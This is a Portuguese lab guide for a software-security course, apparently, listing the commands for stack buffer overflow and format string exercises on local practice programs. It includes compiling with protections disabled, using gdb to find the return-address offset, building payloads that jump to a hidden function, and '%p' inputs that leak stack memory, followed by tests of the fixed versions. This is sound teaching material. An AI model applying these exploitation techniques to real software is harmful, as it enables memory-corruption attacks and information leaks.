# Semana 11 - Como testar

## Dependências

```bash
sudo apt update
sudo apt install -y gcc gdb python3
mkdir -p ~/ssi-lab-swsec
cd ~/ssi-lab-swsec
```

## Parte A - Buffer Overflow

### Exercício 1

```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie -g
```

### Exercício 2

```bash
./vuln "Hello"
gdb -q ./vuln
```

Dentro do GDB:

```gdb
break process_input
run Hello
print &buffer
info frame
print (void*)secret_function
p/d (char*)$rbp + 8 - (char*)&buffer
quit
```

### Exercício 3

```bash
python3 make_payload.py 72 0x4011b6 > payload.bin
./vuln "$(cat payload.bin)"
```

### Exercício 4

```bash
gcc -o vuln vuln.c -z execstack -no-pie -g
./vuln "Hello"
ADDR=$(./vuln "Hello" | awk '/secret_function is at:/ {print $5}')
python3 make_payload.py 72 "$ADDR" > payload_canary.bin
./vuln "$(cat payload_canary.bin)"
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack -g
./vuln "Hello"
./vuln "Hello"
ADDR=$(./vuln "Hello" | awk '/secret_function is at:/ {print $5}')
python3 make_payload.py 72 "$ADDR" > payload_pie.bin
./vuln "$(cat payload_pie.bin)"
```

```bash
gcc -o vuln vuln.c -g
./vuln "Hello"
ADDR=$(./vuln "Hello" | awk '/secret_function is at:/ {print $5}')
python3 make_payload.py 72 "$ADDR" > payload_default.bin
./vuln "$(cat payload_default.bin)"
```

### Exercício 5

```bash
gcc -o vuln_fixed vuln_fixed.c -g
./vuln_fixed "Hello"
./vuln_fixed "$(python3 -c "print('A'*200)")"
```

## Parte B - Format String

### Exercício 6

```bash
gcc -o fmtvuln fmtvuln.c -g -Wall -Wformat -Wformat-security 2>&1 | tee ex6_warnings.txt
gcc -o fmtvuln fmtvuln.c -g
./fmtvuln "Hello, world!"
```

### Exercício 7

```bash
./fmtvuln "%p %p %p %p %p %p %p %p %p %p"
./fmtvuln "%x %x %x %x %x %x %x %x %x %x"
```

### Exercício 8

```bash
./fmtvuln "$(python3 -c "print('%p ' * 30, end='')")"
./fmtvuln "$(python3 -c "print('%p ' * 40, end='')")"
./fmtvuln "$(python3 -c "print('%p ' * 50, end='')")"
```

### Exercício 9

```bash
gcc -o fmtvuln_fixed fmtvuln_fixed.c -g -Wall -Wformat -Wformat-security 2>&1 | tee ex9_warnings.txt
./fmtvuln_fixed "%p %p %p %p"
```
